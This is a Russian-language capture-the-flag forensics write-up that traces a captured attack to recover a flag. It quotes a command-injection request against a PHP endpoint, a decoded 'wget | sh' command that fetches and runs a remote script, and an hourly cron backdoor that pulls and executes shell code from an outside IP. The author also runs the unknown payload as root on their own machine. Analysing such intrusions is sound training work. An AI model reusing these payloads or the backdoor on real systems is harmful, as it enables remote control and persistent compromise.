# H4x0r3d writeup

Исходя из условия таска, предпринимаем попытку найти какой-либо `интересный` запрос к приложению автора таска, в котором бы содержалась полезная нагрузка - проверяем файл
`access.log` и находим там следующий `GET` запрос:

```
192.168.138.1 - - [29/Oct/2020:00:08:06 +0300] "GET /test-verysecretfile.php?expression=shell_exec%28%22%60echo+c2ggLWMgIiQod2dldCAtTy1odHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FldGhlckV0ZXJuaXR5LzQ4NGZlYzZmYjBmMjdlZjZlYzgxYjU4YWVlNTZlZGQxL3Jhdy8wN2MyZjc5NjBlYTE1MmVmOTRjMjBmZDJjMDlkZjU0YmMyMWQ4NmU5L3N0YWdlLnNoKSI%3D+%7C+base64+-d%60%22%29 HTTP/1.1" 200 435 "-" "python-requests/2.23.0"
```

Декодируем полезную нагрузку из запроса:

```
root@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/H4x0r3d# echo c2ggLWMgIiQod2dldCAtTy1odHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FldGhlckV0ZXJuaXR5LzQ4NGZlYzZmYjBmMjdlZjZlYzgxYjU4YWVlNTZlZGQxL3Jhdy8wN2MyZjc5NjBlYTE1MmVmOTRjMjBmZDJjMDlkZjU0YmMyMWQ4NmU5L3N0YWdlLnNoKSI | base64 -d
sh -c "$(wget -O-https://gist.githubusercontent.com/AetherEternity/484fec6fb0f27ef6ec81b58aee56edd1/raw/07c2f7960ea152ef94c20fd2c09df54bc21d86e9/stage.sh)"
root@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/H4x0r3d#
```

Выполняем команду, полученную в результате расшифровки нагрузки:

```
root@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/H4x0r3d# sh -c "$(wget -O- https://gist.githubusercontent.com/AetherEternity/484fec6fb0f27ef6ec81b58aee56edd1/raw/07c2f7960ea152ef94c20fd2c09df54bc21d86e9/stage.sh)"
--2020-11-21 18:50:25--  https://gist.githubusercontent.com/AetherEternity/484fec6fb0f27ef6ec81b58aee56edd1/raw/07c2f7960ea152ef94c20fd2c09df54bc21d86e9/stage.sh
Resolving gist.githubusercontent.com (gist.githubusercontent.com)... 151.101.12.133
Connecting to gist.githubusercontent.com (gist.githubusercontent.com)|151.101.12.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 249 [text/plain]
Saving to: ‘STDOUT’

-                                    100%[===================================================================>]     249  --.-KB/s    in 0s

2020-11-21 18:50:25 (2.86 MB/s) - written to stdout [249/249]

--2020-11-21 18:50:26--  http://188.143.222.218:4455/persist?uuid=UFcl4aVzlBume5L42MmSGBEXigbTB6Tn
Connecting to 188.143.222.218:4455... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: http://188.143.222.218:4455/persist/?uuid=UFcl4aVzlBume5L42MmSGBEXigbTB6Tn [following]
--2020-11-21 18:50:26--  http://188.143.222.218:4455/persist/?uuid=UFcl4aVzlBume5L42MmSGBEXigbTB6Tn
Reusing existing connection to 188.143.222.218:4455.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘/etc/cron.hourly/persist’

/etc/cron.hourly/persist                 [ <=>                                                                ]     154  --.-KB/s    in 0s

2020-11-21 18:50:26 (3.69 MB/s) - ‘/etc/cron.hourly/persist’ saved [154]

root@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/H4x0r3d# cat /etc/cron.hourly/persist

#!/bin/sh
UUID = `cat /etc/persist`
BASE = "http://188.143.222.218:4455/?uuid="
logger -s "Started door with uid $UUID"
sh -c "$(wget -O- $BASE$NEW_UUID)"
root@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/H4x0r3d#
```

Как мы можем узнать этот `UUID`? Давайте изучим файл `syslog`:

```
Oct 29 0:26:54 debian-min root: Started door with uid AV0pUn47GjLGyaOXdMAbfeuef6WDFGfy
```

Теперь используем консольную утилиту `curl` для перехода на http://188.143.222.218:4455/persist/?uuid=AV0pUn47GjLGyaOXdMAbfeuef6WDFGfy:

```
root@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/H4x0r3d# curl http://188.143.222.218:4455?uuid=AV0pUn47GjLGyaOXdMAbfeuef6WDFGfy
sh -c "`echo ZWNobyBPTllHRVkzVU1aNVdXTVpUT0JQWFNNRFZPSlBXTTVEUUw1WlRJWlJUUFVGQT09PT0gfCBiYXNlMzIgLWQgPiAvZXRjL3NlY3JldC5mbGFnCg== | base64 -d`"
root@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/H4x0r3d#
```
Затем дважды декодируем полученные строки и получаем флаг:

```
root@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/H4x0r3d# sh -c "`echo ZWNobyBPTllHRVkzVU1aNVdXTVpUT0JQWFNNRFZPSlBXTTVEUUw1WlRJWlJUUFVGQT09PT0gfCBiYXNlMzIgLWQgPiAvZXRjL3NlY3JldC5mbGFnCg== | base64 -d`"
echo ONYGEY3UMZ5WWMZTOBPXSMDVOJPWM5DQL5ZTIZRTPUFA==== | base32 -d > /etc/secret.flag
root@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/H4x0r3d# cat /etc/secret.flag
spbctf{k33p_y0ur_ftp_s4f3}
root@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/H4x0r3d#
```
